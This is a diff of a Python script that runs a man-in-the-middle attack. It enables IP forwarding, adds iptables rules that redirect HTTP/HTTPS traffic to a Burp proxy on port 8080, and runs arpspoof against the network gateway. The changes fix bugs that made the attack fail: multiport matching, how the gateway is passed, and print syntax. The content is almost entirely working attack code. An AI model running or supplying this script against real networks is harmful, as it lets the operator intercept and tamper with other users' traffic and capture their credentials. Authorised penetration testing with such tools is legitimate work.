@@ -16,11 +16,11 @@ def add_rules():
 	os.system("sysctl net.ipv4.ip_forward=1")
 	# firewall redirection to burp
 	os.system("sudo iptables -A FORWARD --in-interface " + options.iface + " -j ACCEPT")
-	os.system("sudo iptables -t nat -A PREROUTING -i " + options.iface + " -p tcp --dport 80,443 -j REDIRECT --to-port 8080")
+	os.system("sudo iptables -t nat -A PREROUTING -i " + options.iface + " -p tcp -m multiport --dport 80,443,8080 -j REDIRECT --to-port 8080")
 
 def remove_rules():
 	os.system("sudo iptables -D FORWARD --in-interface " + options.iface + " -j ACCEPT")
-	os.system("sudo iptables -D PREROUTING -t nat -i " + options.iface + " -p tcp --dport 80,443 -j REDIRECT --to-port 8080")
+	os.system("sudo iptables -D PREROUTING -t nat -i " + options.iface + " -p tcp -m multiport --dport 80,443,8080 -j REDIRECT --to-port 8080")
 
 def get_gateway():
 	gws = netifaces.gateways()['default'][netifaces.AF_INET]
@@ -30,8 +30,8 @@ def get_gateway():
 		print ("Gateway not Found !")
 		exit()
 
-def mitm_process():
-	os.system("arpspoof -i " + iface + " " + gateway)
+def mitm_process(gateway):
+	os.system("arpspoof -i " + options.iface + " " + gateway)
 
 def requirements_installation():
 	os.system("pip install netifaces")
@@ -47,7 +47,7 @@ try:
 			add_rules()
 			mitm_process(get_gateway())
 		else:
-			print sys.argv[0] + " -i [iface]"
+			print (sys.argv[0] + " -i [iface]")
 except KeyboardInterrupt:
 	remove_rules()
 except:
